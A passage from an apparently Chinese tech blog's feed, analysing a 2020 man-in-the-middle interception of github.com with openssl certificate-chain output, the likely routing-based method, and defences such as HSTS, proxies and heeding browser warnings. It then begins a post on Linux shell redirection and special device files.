</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">➜  ~ openssl s_client -showcerts -connect github.com:443 &lt; /dev/null
CONNECTED<span class="o">(</span>00000003<span class="o">)</span>
<span class="nv">depth</span><span class="o">=</span><span class="m">1</span> <span class="nv">C</span> <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
verify error:num<span class="o">=</span>19:self signed certificate in certificate chain
verify <span class="k">return</span>:1
<span class="nv">depth</span><span class="o">=</span><span class="m">1</span> <span class="nv">C</span> <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
verify <span class="k">return</span>:1
<span class="nv">depth</span><span class="o">=</span><span class="m">0</span> <span class="nv">C</span> <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> SERVER, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
verify <span class="k">return</span>:1
---
Certificate chain
 <span class="m">0</span> s:C <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> SERVER, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
   i:C <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
-----BEGIN CERTIFICATE-----
MIIB4TCCAYcCFDjGwZUOfrr1+SWHR5GxJ/rwXsHZMAoGCCqGSM49BAMCMHExCzAJ
BgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoMA0NP
TTEMMAoGA1UECwwDTlNQMQswCQYDVQQDDAJDQTEfMB0GCSqGSIb3DQEJARYQMzQ2
NjA4NDUzQHFxLmNvbTAeFw0xOTA5MjYwOTMzMTNaFw0yOTA5MjMwOTMzMTNaMHUx
CzAJBgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoM
A0NPTTEMMAoGA1UECwwDTlNQMQ8wDQYDVQQDDAZTRVJWRVIxHzAdBgkqhkiG9w0B
CQEWEDM0NjYwODQ1M0BxcS5jb20wWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAASJ
27aMaVclvmdT8m6l98K999FM4dYTg4ag0627S2bxbLYHyLdQ0jqay5kA9KCF9Ucw
uzcqtTrNERlLIsxDGkLjMAoGCCqGSM49BAMCA0gAMEUCIH1+jEiQTVA+siP2g9kw
ITFZZINVKyET48788OSCLK1hAiEA+c5bJvnrdtZ1rbsLXJWtglkXSeBaHy5Wdt7w
<span class="nv">dGc7McM</span><span class="o">=</span>
-----END CERTIFICATE-----
 <span class="m">1</span> s:C <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
   i:C <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
-----BEGIN CERTIFICATE-----
MIICNzCCAd2gAwIBAgIUD6UJah0ReDrJIuxhqrTa0CAAbAMwCgYIKoZIzj0EAwIw
cTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoGA1UE
CgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcNAQkB
FhAzNDY2MDg0NTNAcXEuY29tMB4XDTE5MDkyNjA5MzIzN1oXDTI5MDkyMzA5MzIz
N1owcTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoG
A1UECgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcN
AQkBFhAzNDY2MDg0NTNAcXEuY29tMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE
qZ26n2ml6hcyf+NS0TP8PSZ1qlFzUb/tpr6Wb6zE9cSzkGOXej0ddI3sNvq/bLzk
LLvaQLEzaIFyRDY6fcSQ36NTMFEwHQYDVR0OBBYEFKv8Ri5sjN4WZoaWvK/h9Yf+
zhVyMB8GA1UdIwQYMBaAFKv8Ri5sjN4WZoaWvK/h9Yf+zhVyMA8GA1UdEwEB/wQF
MAMBAf8wCgYIKoZIzj0EAwIDSAAwRQIhANFUxlZxx3dfmxEu1I0huK9eY/IPl6Xz
AsUXUQZN2QPXAiACddgQK7I4I86sjPwjCMafPES9LkV/whcFV60LlAftaQ<span class="o">==</span>
-----END CERTIFICATE-----
---
Server certificate
<span class="nv">subject</span><span class="o">=</span><span class="nv">C</span> <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> SERVER, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com

<span class="nv">issuer</span><span class="o">=</span><span class="nv">C</span> <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com

---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: ECDSA
Server Temp Key: X25519, <span class="m">253</span> bits
---
SSL handshake has <span class="nb">read</span> <span class="m">1499</span> bytes and written <span class="m">395</span> bytes
Verification error: self signed certificate in certificate chain
---
New, TLSv1.2, Cipher is ECDHE-ECDSA-AES128-GCM-SHA256
Server public key is <span class="m">256</span> bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-ECDSA-AES128-GCM-SHA256
    Session-ID: 1A4A06D58F5DCC0FA80FFE4125AC12E555126BF8B7C7C627210B9C36F3B5A6ED
    Session-ID-ctx:
    Master-Key: 6BD176466BF93E52D592216063276369497FA26AFF0E7343A872FFA6E3F12BFF611BFDA4F5994F297ECC5772EE812305
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: <span class="m">7200</span> <span class="o">(</span>seconds<span class="o">)</span>
    TLS session ticket:
    <span class="m">0000</span> - 7a 4c <span class="m">52</span> 3b d5 f6 1c c4-ea 0d <span class="m">86</span> <span class="m">45</span> <span class="m">37</span> 1a <span class="m">57</span> c4   zLR<span class="p">;</span>.......E7.W.
    <span class="m">0010</span> - a5 <span class="m">47</span> 0e <span class="m">76</span> <span class="m">87</span> 9f f1 68-ac 6c <span class="m">37</span> e3 <span class="m">02</span> <span class="m">87</span> <span class="m">61</span> <span class="m">77</span>   .G.v...h.l7...aw
    <span class="m">0020</span> - d9 c5 6a <span class="m">65</span> <span class="m">88</span> 3c <span class="m">44</span> e5-17 <span class="m">59</span> 5e <span class="m">30</span> de <span class="m">55</span> <span class="m">51</span> 4a   ..je.&lt;D..Y^0.UQJ
    <span class="m">0030</span> - f4 9e <span class="m">51</span> c9 <span class="m">35</span> ee ff a9-62 <span class="m">60</span> a2 7d <span class="m">63</span> <span class="nb">fc</span> c1 f9   ..Q.5...b<span class="sb">`</span>.<span class="o">}</span>c...
    <span class="m">0040</span> - a4 bf <span class="m">41</span> c5 2f <span class="m">42</span> 9a 7c-6d b0 <span class="m">99</span> <span class="m">49</span> <span class="m">63</span> 1c 0f 5c   ..A./B.<span class="p">|</span>m..Ic..<span class="se">\
</span><span class="se"></span>    <span class="m">0050</span> - <span class="m">37</span> ce <span class="m">32</span> <span class="m">85</span> e6 fb <span class="m">49</span> 5a-01 <span class="m">97</span> 9d <span class="m">23</span> 6c c6 9e b3   7.2...IZ...#l...
    <span class="m">0060</span> - <span class="m">56</span> dc ae c6 <span class="m">76</span> cf c6 ba-95 <span class="m">16</span> c6 c8 <span class="m">57</span> d1 be c7   V...v.......W...
    <span class="m">0070</span> - d0 a3 f9 <span class="m">66</span> c6 4e a9 99-52 <span class="m">60</span> fe <span class="m">53</span> <span class="m">61</span> 9d <span class="m">15</span> b1   ...f.N..R<span class="sb">`</span>.Sa...
    <span class="m">0080</span> - d2 1f a0 3c 0c <span class="m">78</span> <span class="m">41</span> af-d8 ac <span class="m">59</span> <span class="m">95</span> 9f c9 2f 1c   ...&lt;.xA...Y.../.
    <span class="m">0090</span> - <span class="m">07</span> <span class="m">25</span> <span class="m">74</span> 3e ae <span class="m">28</span> <span class="m">03</span> 1f-1b fd 0d b4 f8 c3 ad 4f   .%t&gt;.<span class="o">(</span>.........O

    Start Time: <span class="m">1585268898</span>
    Timeout   : <span class="m">7200</span> <span class="o">(</span>sec<span class="o">)</span>
    Verify <span class="k">return</span> code: <span class="m">19</span> <span class="o">(</span>self signed certificate in certificate chain<span class="o">)</span>
    Extended master secret: yes
---
DONE
</code></pre></td></tr></table>
</div>
</div></details>
<h3 id="香港阿里云">香港阿里云</h3>
<details>
  <summary>点击展开</summary>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">➜  ~ openssl s_client -showcerts -connect github.com:443 &lt; /dev/null
CONNECTED<span class="o">(</span>00000005<span class="o">)</span>
<span class="nv">depth</span><span class="o">=</span><span class="m">2</span> <span class="nv">C</span> <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert High Assurance EV Root CA
verify <span class="k">return</span>:1
<span class="nv">depth</span><span class="o">=</span><span class="m">1</span> <span class="nv">C</span> <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert SHA2 Extended Validation Server CA
verify <span class="k">return</span>:1
<span class="nv">depth</span><span class="o">=</span><span class="m">0</span> <span class="nv">businessCategory</span> <span class="o">=</span> Private Organization, <span class="nv">jurisdictionC</span> <span class="o">=</span> US, <span class="nv">jurisdictionST</span> <span class="o">=</span> Delaware, <span class="nv">serialNumber</span> <span class="o">=</span> 5157550, <span class="nv">C</span> <span class="o">=</span> US, <span class="nv">ST</span> <span class="o">=</span> California, <span class="nv">L</span> <span class="o">=</span> San Francisco, <span class="nv">O</span> <span class="o">=</span> <span class="s2">&#34;GitHub, Inc.&#34;</span>, <span class="nv">CN</span> <span class="o">=</span> github.com
verify <span class="k">return</span>:1
---
Certificate chain
 <span class="m">0</span> s:businessCategory <span class="o">=</span> Private Organization, <span class="nv">jurisdictionC</span> <span class="o">=</span> US, <span class="nv">jurisdictionST</span> <span class="o">=</span> Delaware, <span class="nv">serialNumber</span> <span class="o">=</span> 5157550, <span class="nv">C</span> <span class="o">=</span> US, <span class="nv">ST</span> <span class="o">=</span> California, <span class="nv">L</span> <span class="o">=</span> San Francisco, <span class="nv">O</span> <span class="o">=</span> <span class="s2">&#34;GitHub, Inc.&#34;</span>, <span class="nv">CN</span> <span class="o">=</span> github.com
   i:C <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert SHA2 Extended Validation Server CA
-----BEGIN CERTIFICATE-----
MIIHQjCCBiqgAwIBAgIQCgYwQn9bvO1pVzllk7ZFHzANBgkqhkiG9w0BAQsFADB1
MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3
d3cuZGlnaWNlcnQuY29tMTQwMgYDVQQDEytEaWdpQ2VydCBTSEEyIEV4dGVuZGVk
IFZhbGlkYXRpb24gU2VydmVyIENBMB4XDTE4MDUwODAwMDAwMFoXDTIwMDYwMzEy
MDAwMFowgccxHTAbBgNVBA8MFFByaXZhdGUgT3JnYW5pemF0aW9uMRMwEQYLKwYB
BAGCNzwCAQMTAlVTMRkwFwYLKwYBBAGCNzwCAQITCERlbGF3YXJlMRAwDgYDVQQF
Ewc1MTU3NTUwMQswCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQG
A1UEBxMNU2FuIEZyYW5jaXNjbzEVMBMGA1UEChMMR2l0SHViLCBJbmMuMRMwEQYD
VQQDEwpnaXRodWIuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
xjyq8jyXDDrBTyitcnB90865tWBzpHSbindG/XqYQkzFMBlXmqkzC+FdTRBYyneZ
w5Pz+XWQvL+74JW6LsWNc2EF0xCEqLOJuC9zjPAqbr7uroNLghGxYf13YdqbG5oj
/4x+ogEG3dF/U5YIwVr658DKyESMV6eoYV9mDVfTuJastkqcwero+5ZAKfYVMLUE
sMwFtoTDJFmVf6JlkOWwsxp1WcQ/MRQK1cyqOoUFUgYylgdh3yeCDPeF22Ax8AlQ
xbcaI+GwfQL1FB7Jy+h+KjME9lE/UpgV6Qt2R1xNSmvFCBWu+NFX6epwFP/JRbkM
fLz0beYFUvmMgLtwVpEPSwIDAQABo4IDeTCCA3UwHwYDVR0jBBgwFoAUPdNQpdag
re7zSmAKZdMh1Pj41g8wHQYDVR0OBBYEFMnCU2FmnV+rJfQmzQ84mqhJ6kipMCUG
A1UdEQQeMByCCmdpdGh1Yi5jb22CDnd3dy5naXRodWIuY29tMA4GA1UdDwEB/wQE
AwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwdQYDVR0fBG4wbDA0
oDKgMIYuaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItZXYtc2VydmVyLWcy
LmNybDA0oDKgMIYuaHR0cDovL2NybDQuZGlnaWNlcnQuY29tL3NoYTItZXYtc2Vy
dmVyLWcyLmNybDBLBgNVHSAERDBCMDcGCWCGSAGG/WwCATAqMCgGCCsGAQUFBwIB
FhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BTMAcGBWeBDAEBMIGIBggrBgEF
BQcBAQR8MHowJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBS
BggrBgEFBQcwAoZGaHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0
U0hBMkV4dGVuZGVkVmFsaWRhdGlvblNlcnZlckNBLmNydDAMBgNVHRMBAf8EAjAA
MIIBfgYKKwYBBAHWeQIEAgSCAW4EggFqAWgAdgCkuQmQtBhYFIe7E6LMZ3AKPDWY
BPkb37jjd80OyA3cEAAAAWNBYm0KAAAEAwBHMEUCIQDRZp38cTWsWH2GdBpe/uPT
Wnsu/m4BEC2+dIcvSykZYgIgCP5gGv6yzaazxBK2NwGdmmyuEFNSg2pARbMJlUFg
U5UAdgBWFAaaL9fC7NP14b1Esj7HRna5vJkRXMDvlJhV1onQ3QAAAWNBYm0tAAAE
AwBHMEUCIQCi7omUvYLm0b2LobtEeRAYnlIo7n6JxbYdrtYdmPUWJQIgVgw1AZ51
vK9ENinBg22FPxb82TvNDO05T17hxXRC2IYAdgC72d+8H4pxtZOUI5eqkntHOFeV
CqtS6BqQlmQ2jh7RhQAAAWNBYm3fAAAEAwBHMEUCIQChzdTKUU2N+XcqcK0OJYrN
8EYynloVxho4yPk6Dq3EPgIgdNH5u8rC3UcslQV4B9o0a0w204omDREGKTVuEpxG
eOQwDQYJKoZIhvcNAQELBQADggEBAHAPWpanWOW/ip2oJ5grAH8mqQfaunuCVE+v
ac+88lkDK/LVdFgl2B6kIHZiYClzKtfczG93hWvKbST4NRNHP9LiaQqdNC17e5vN
HnXVUGw+yxyjMLGqkgepOnZ2Rb14kcTOGp4i5AuJuuaMwXmCo7jUwPwfLe1NUlVB
Kqg6LK0Hcq4K0sZnxE8HFxiZ92WpV2AVWjRMEc/2z2shNoDvxvFUYyY1Oe67xINk
myQKc+ygSBZzyLnXSFVWmHr3u5dcaaQGGAR42v6Ydr4iL38Hd4dOiBma+FXsXBIq
WUjbST4VXmdaol7uzFMojA4zkxQDZAvF5XgJlAFadfySna/teik<span class="o">=</span>
-----END CERTIFICATE-----
 <span class="m">1</span> s:C <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert SHA2 Extended Validation Server CA
   i:C <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert High Assurance EV Root CA
-----BEGIN CERTIFICATE-----
MIIEtjCCA56gAwIBAgIQDHmpRLCMEZUgkmFf4msdgzANBgkqhkiG9w0BAQsFADBs
MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3
d3cuZGlnaWNlcnQuY29tMSswKQYDVQQDEyJEaWdpQ2VydCBIaWdoIEFzc3VyYW5j
ZSBFViBSb290IENBMB4XDTEzMTAyMjEyMDAwMFoXDTI4MTAyMjEyMDAwMFowdTEL
MAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3
LmRpZ2ljZXJ0LmNvbTE0MDIGA1UEAxMrRGlnaUNlcnQgU0hBMiBFeHRlbmRlZCBW
YWxpZGF0aW9uIFNlcnZlciBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
ggEBANdTpARR+JmmFkhLZyeqk0nQOe0MsLAAh/FnKIaFjI5j2ryxQDji0/XspQUY
uD0+xZkXMuwYjPrxDKZkIYXLBxA0sFKIKx9om9KxjxKws9LniB8f7zh3VFNfgHk/
LhqqqB5LKw2rt2O5Nbd9FLxZS99RStKh4gzikIKHaq7q12TWmFXo/a8aUGxUvBHy
/Urynbt/DvTVvo4WiRJV2MBxNO723C3sxIclho3YIeSwTQyJ3DkmF93215SF2AQh
cJ1vb/9cuhnhRctWVyh+HA1BV6q3uCe7seT6Ku8hI3UarS2bhjWMnHe1c63YlC3k
8wyd7sFOYn4XwHGeLN7x+RAoGTMCAwEAAaOCAUkwggFFMBIGA1UdEwEB/wQIMAYB
Af8CAQAwDgYDVR0PAQH/BAQDAgGGMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEF
BQcDAjA0BggrBgEFBQcBAQQoMCYwJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRp
Z2ljZXJ0LmNvbTBLBgNVHR8ERDBCMECgPqA8hjpodHRwOi8vY3JsNC5kaWdpY2Vy
dC5jb20vRGlnaUNlcnRIaWdoQXNzdXJhbmNlRVZSb290Q0EuY3JsMD0GA1UdIAQ2
MDQwMgYEVR0gADAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2VydC5j
b20vQ1BTMB0GA1UdDgQWBBQ901Cl1qCt7vNKYApl0yHU+PjWDzAfBgNVHSMEGDAW
gBSxPsNpA/i/RwHUmCYaCALvY2QrwzANBgkqhkiG9w0BAQsFAAOCAQEAnbbQkIbh
hgLtxaDwNBx0wY12zIYKqPBKikLWP8ipTa18CK3mtlC4ohpNiAexKSHc59rGPCHg
4xFJcKx6HQGkyhE6V6t9VypAdP3THYUYUN9XR3WhfVUgLkc3UHKMf4Ib0mKPLQNa
2sPIoc4sUqIAY+tzunHISScjl2SFnjgOrWNoPLpSgVh5oywM395t6zHyuqB8bPEs
1OG9d4Q3A84ytciagRpKkk47RpqF/oOi+Z6Mo8wNXrM9zwR4jxQUezKcxwCmXMS1
oVWNWlZopCJwqjyBcdmdqEU79OX2olHdx3ti6G8MdOu42vi/hw15UJGQmxg7kVkn
<span class="nv">8TUoE6smftX3eg</span><span class="o">==</span>
-----END CERTIFICATE-----
---
Server certificate
<span class="nv">subject</span><span class="o">=</span><span class="nv">businessCategory</span> <span class="o">=</span> Private Organization, <span class="nv">jurisdictionC</span> <span class="o">=</span> US, <span class="nv">jurisdictionST</span> <span class="o">=</span> Delaware, <span class="nv">serialNumber</span> <span class="o">=</span> 5157550, <span class="nv">C</span> <span class="o">=</span> US, <span class="nv">ST</span> <span class="o">=</span> California, <span class="nv">L</span> <span class="o">=</span> San Francisco, <span class="nv">O</span> <span class="o">=</span> <span class="s2">&#34;GitHub, Inc.&#34;</span>, <span class="nv">CN</span> <span class="o">=</span> github.com

<span class="nv">issuer</span><span class="o">=</span><span class="nv">C</span> <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert SHA2 Extended Validation Server CA

---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, <span class="m">253</span> bits
---
SSL handshake has <span class="nb">read</span> <span class="m">3621</span> bytes and written <span class="m">376</span> bytes
Verification: OK
---
New, TLSv1.3, Cipher is TLS_AES_128_GCM_SHA256
Server public key is <span class="m">2048</span> bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify <span class="k">return</span> code: <span class="m">0</span> <span class="o">(</span>ok<span class="o">)</span>
---
DONE
</code></pre></td></tr></table>
</div>
</div></details>
<h2 id="实施手段">实施手段</h2>
<p>通过检查网络和对出现的状况的分析，我认为这次MITM不是通过sni或者返回的证书进行的，而是直接针对某些ip的443端口进行的</p>
<p>通过控制这些ip的路由，让流量经过某些恶意节点，在某个恶意节点针对443端口进行MITM，而不检查实际访问的域名和返回的证书</p>
<p>并且这次事件所影响的github的ip并不全，通过doh或dot获取到国外服务器解析到的ip而不是国内使用的几个ip，可以正常访问github</p>
<h2 id="危害">危害</h2>
<p>使用TLS是保证我们访问网站时信息不被中间人窥探和篡改的有效手段，如果TLS用来加密通讯使用的证书出现问题，那么信息安全就无从谈起</p>
<p>TLS使用公钥密码算法交换后面数据进行对称加密使用的秘钥，作为中间人没有服务器上的私钥就无法解密获得后面加密使用的秘钥，所以即使截获到https的数据报文，也无法解密和篡改传输的内容</p>
<p>而本次事件使用的手法是MITM常用手法，通常情况下我们为了抓包和改包，会自己签署一个假的证书并导入自己被抓包设备的信任证书列表，然后中间人分别与服务器和客户端建立TLS连接，简单来说，中间人作为客户端从服务器获取内容，然后作为服务器向真正的客户端传输修改后的内容</p>
<p>所以如果我们信任了浏览器给出的警告，就会导致我们的信息包括github用户名、邮箱、密码、token和私有库泄露</p>
<h2 id="如何防范">如何防范</h2>
<p>作为站长，首先可以确定的是，并没有什么用户无痛(无需用户进行任何操作和设置)的办法来绕过这类针对性的MITM攻击，如果需要保护用户的隐私，建议开启域名的HSTS策略，这样浏览器检查到证书错误时的警告页面上就不会显示 <code>忽略警告</code> 相关按钮，防止不懂的用户忽略安全警告进行访问，避免隐私数据泄露</p>
<p>当然，像昨天那种针对 Github Pages 的攻击只会导致用户无法访问，并不会带来隐私泄露，因为github pages是提供静态网页托管，根本不需要用户输入隐私数据</p>
<p>作为访客，因为这种中间人攻击肯定发生在路由路径的某一个节点处，所以我们可以使用代理绕过这个恶意节点，这应该是目前最简单最好用的方法了</p>
<p>同时，当我们在浏览器中发现此类警告，除非是对证书内容充分信任(如自己为了调试而签发的证书)，否则不要忽视任何此类的警告而强行访问，否则隐私信息泄露在所难免</p>
<blockquote>
<p>因为我自己访问国外网站一直是使用代理，所以本次事件对我的影响几乎等于零
因为不受影响，所以也很难在第一时间发现这类事件，后续需要准备一个监控系统了</p>
</blockquote>
]]></description></item><item><title>Linux Shell中的重定向</title><link>https://lgf.im/posts/linux/redirect-in-shell/</link><pubDate>Tue, 24 Mar 2020 15:50:07 +0000</pubDate><author/><guid>https://lgf.im/posts/linux/redirect-in-shell/</guid><description><![CDATA[<p>经常会看到别人的shell脚本后面有一个 <code>2&gt;&amp;1</code> ，一直没去深究，今天这个话题就以这个为出发点进行展开，学习一下linux shell中重定向的话题。</p>
<h2 id="特殊的东西">特殊的东西</h2>
<p>先来看一点linux中特殊的东西，为后面的内容打下基础</p>
<h3 id="特殊的文件">特殊的文件</h3>
<ul>
<li><code>/dev/null</code> 空，可以将垃圾内容导入其中，就会消失</li>
<li><code>/dev/zero</code> 零，可以从中读出无穷无尽的0</li>
<li><code>/dev/urandom</code> 随机数，可以从中读出无穷无尽的随机数</li>
<li><code>/dev/stdin</code> 标准输入流</li>
<li><code>/dev/stdout</code> 标准输出流</li>
<li><code>/dev/stderr</code> 标准错误输出流</li>
</ul>
